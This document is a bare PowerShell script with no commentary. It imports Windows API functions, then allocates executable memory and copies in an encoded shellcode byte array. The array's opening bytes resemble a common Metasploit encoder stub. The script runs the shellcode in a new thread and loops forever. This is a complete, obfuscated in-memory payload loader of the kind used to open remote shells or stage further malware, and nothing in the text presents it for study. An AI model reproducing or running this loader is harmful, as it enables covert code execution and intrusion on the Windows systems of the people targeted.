
$Q0qN = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Q0qN -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xc2,0xc2,0x8a,0xef,0xdb,0xda,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x53,0x0f,0x03,0x53,0xcd,0x20,0x7f,0x13,0x39,0x26,0x80,0xec,0xb9,0x47,0x08,0x09,0x88,0x47,0x6e,0x59,0xba,0x77,0xe4,0x0f,0x36,0xf3,0xa8,0xbb,0xcd,0x71,0x65,0xcb,0x66,0x3f,0x53,0xe2,0x77,0x6c,0xa7,0x65,0xfb,0x6f,0xf4,0x45,0xc2,0xbf,0x09,0x87,0x03,0xdd,0xe0,0xd5,0xdc,0xa9,0x57,0xca,0x69,0xe7,0x6b,0x61,0x21,0xe9,0xeb,0x96,0xf1,0x08,0xdd,0x08,0x8a,0x52,0xfd,0xab,0x5f,0xef,0xb4,0xb3,0xbc,0xca,0x0f,0x4f,0x76,0xa0,0x91,0x99,0x47,0x49,0x3d,0xe4,0x68,0xb8,0x3f,0x20,0x4e,0x23,0x4a,0x58,0xad,0xde,0x4d,0x9f,0xcc,0x04,0xdb,0x04,0x76,0xce,0x7b,0xe1,0x87,0x03,0x1d,0x62,0x8b,0xe8,0x69,0x2c,0x8f,0xef,0xbe,0x46,0xab,0x64,0x41,0x89,0x3a,0x3e,0x66,0x0d,0x67,0xe4,0x07,0x14,0xcd,0x4b,0x37,0x46,0xae,0x34,0x9d,0x0c,0x42,0x20,0xac,0x4e,0x0a,0x85,0x9d,0x70,0xca,0x81,0x96,0x03,0xf8,0x0e,0x0d,0x8c,0xb0,0xc7,0x8b,0x4b,0xb7,0xfd,0x6c,0xc3,0x46,0xfe,0x8c,0xcd,0x8c,0xaa,0xdc,0x65,0x25,0xd3,0xb6,0x75,0xca,0x06,0x22,0x73,0x5c,0x69,0x1b,0x24,0x1e,0x01,0x5e,0xdb,0x1f,0x69,0xd7,0x3d,0x4f,0xdd,0xb8,0x91,0x2f,0x8d,0x78,0x42,0xc7,0xc7,0x76,0xbd,0xf7,0xe7,0x5c,0xd6,0x9d,0x07,0x09,0x8e,0x09,0xb1,0x10,0x44,0xa8,0x3e,0x8f,0x20,0xea,0xb5,0x3c,0xd4,0xa4,0x3d,0x48,0xc6,0x50,0xce,0x07,0xb4,0xf6,0xd1,0xbd,0xd3,0xf6,0x47,0x3a,0x72,0xa1,0xff,0x40,0xa3,0x85,0x5f,0xba,0x86,0x9e,0x56,0x2e,0x69,0xc8,0x96,0xbe,0x69,0x08,0xc1,0xd4,0x69,0x60,0xb5,0x8c,0x39,0x95,0xba,0x18,0x2e,0x06,0x2f,0xa3,0x07,0xfb,0xf8,0xcb,0xa5,0x22,0xce,0x53,0x55,0x01,0xce,0xa8,0x80,0x6f,0xa4,0xc0,0x10;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$he80=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($he80.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$he80,0,0,0);for (;;){Start-sleep 60};
